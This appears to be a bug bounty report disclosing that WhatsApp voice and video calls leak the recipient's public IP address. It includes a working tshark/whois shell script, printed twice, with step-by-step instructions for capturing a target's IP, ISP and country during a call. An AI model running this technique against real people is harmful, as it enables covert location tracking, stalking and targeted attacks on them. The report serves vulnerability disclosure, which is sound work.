# Title

Leak the IP address of target whatsapp user

# Vuln Type

Privacy / Authorization

# Product Area

WhatsApp

# Description/Impact

Complete Details

===
Latest version of whatsapp application on all platforms is vulnerable to remote whatsapp user public IP disclosure.

It is observed that during a whatsapp (voice / video) call, application on caller side tries to establish a direct connection with the public IP address of recipient device. By filtering the Facebook and WhatsApp server IP addresses from the destination hosts, it is possible to reveal the correct public IP address of the target whatsapp user without his knowledge.

Following is a quick script to exploit this vulnerability,

--------------------------

#!/bin/sh

filter=`tshark -i eth0 -T fields -f "udp" -e ip.dst -Y "ip.dst!=192.168.0.0/16 and ip.dst!=10.0.0.0/8 and ip.dst!=172.16.0.0/12" -c 100 |sort -u |xargs|sed "s/ / and ip.dst!=/g" |sed "s/^/ip.dst!=/g"`

echo "Press Enter and call your target."

read line

tshark -i eth0 -l -T fields -f "udp" -e ip.dst -Y "$filter" -Y "ip.dst!=192.168.0.0/16 and ip.dst!=10.0.0.0/8 and ip.dst!=172.16.0.0/12" | while read line
do
whois $line > /tmp/b

filter=`cat /tmp/b |xargs| egrep -iv "facebook|google"|wc -l`

if [ "$filter" -gt 0 ] ; then
targetinfo=`cat /tmp/b| egrep -iw "OrgName:|NetName:|Country:"`
echo $line --- $targetinfo
fi
done


--------------------------

# Impact

===
Possibility to map whatsapp users with their public IP will not just reveal whatsapp users' location information but can also be misused to track their physical movement by maintaining location history. Such direct mapping between user to IP information can also be misused to track users' surfing habits and to influence him.

Further, the public IP could be exploited to launch targeted attacks towards whatsapp user home or office.

# Repro Steps

Setup
===
Users: UserA is has whatsapp detail of UserB

Environment: n/a

Browser: n/a

App version: <=latest version of whatsapp application on any platform

OS: All platforms except web

Description: UserA makes a whatsapp call to UserB and captures his public IP information without UserB's knowledge. Video PoC for better understanding of steps: https://youtu.be/yPFwzWpK6xU



Steps
==
Step 1: Start WiFi hotspot on attacker machine and connect attacker phone to attacker SSID

Step 2: Start the PoC script (below) on attacker machine which is now acting as a router for attacker phone


--------------------------

#!/bin/sh

filter=`tshark -i eth0 -T fields -f "udp" -e ip.dst -Y "ip.dst!=192.168.0.0/16 and ip.dst!=10.0.0.0/8 and ip.dst!=172.16.0.0/12" -c 100 |sort -u |xargs|sed "s/ / and ip.dst!=/g" |sed "s/^/ip.dst!=/g"`

echo "Press Enter and call your target."

read line

tshark -i eth0 -l -T fields -f "udp" -e ip.dst -Y "$filter" -Y "ip.dst!=192.168.0.0/16 and ip.dst!=10.0.0.0/8 and ip.dst!=172.16.0.0/12" | while read line
do
whois $line > /tmp/b

filter=`cat /tmp/b |xargs| egrep -iv "facebook|google"|wc -l`

if [ "$filter" -gt 0 ] ; then
targetinfo=`cat /tmp/b| egrep -iw "OrgName:|NetName:|Country:"`
echo $line --- $targetinfo
fi
done


--------------------------


Step 3: Call any whatsapp user randomly to capture the server IP addresses to filter

Step 4: Call victim on his whatsapp

Step 5: Disconnect the call once established

Step 6: Script will reveal the public IP address of the target

Step 7: Validate the public IP address on target phone

